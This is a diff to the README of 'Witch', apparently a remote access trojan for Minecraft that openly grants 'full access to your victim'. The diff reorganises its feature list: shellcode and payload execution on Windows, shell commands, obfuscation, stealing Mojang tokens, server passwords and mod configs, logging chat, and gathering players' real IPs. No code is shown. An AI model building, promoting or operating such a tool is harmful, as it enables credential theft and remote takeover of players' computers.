@@ -19,7 +19,7 @@ The Witch system controls Minecraft clients and grant full access to your victim
 
 - Obfuscate
 - Custom server name (for client display)
-- [ ] Encrypted Socket
+- Encrypted Socket
 - [ ] Infect other mods
 - [ ] Command system enhancement
 
@@ -36,18 +36,18 @@ The Witch system controls Minecraft clients and grant full access to your victim
 - Execute shellcode on Windows system (32bit only)
 - Shell commands
 - Execute payloads on Windows system
-- Read text files
 - Get run arguments
 
-### File management
+### Files
 
-### Social engineering
-
-- [ ] More info stealer
+- [ ] More config stealer
 - [IAS](https://modrinth.com/mod/in-game-account-switcher) mod config steal
+- Read text files
+
+### Secret Stealer
+
 - Grab offline server passwords
 - Grab Mojang user tokens
-- Log chat & commands
 
 ### Player information
 
@@ -55,6 +55,7 @@ The Witch system controls Minecraft clients and grant full access to your victim
 - Mod list
 - Player info like coordinates, real ip, etc.
 - Player skin download
+- Log chat & commands
 
 ### Player controlling
 
@@ -76,8 +77,8 @@ The Witch system controls Minecraft clients and grant full access to your victim
 ### Using
 
 * [ ] Client: Build system working
-* Server: `java -jar server.jar <port> <name>`
-* Default port and name: `11451` and `Witch`
+* [ ] Better config
+* Server config in Cfg.java
 
 #### Files:
 
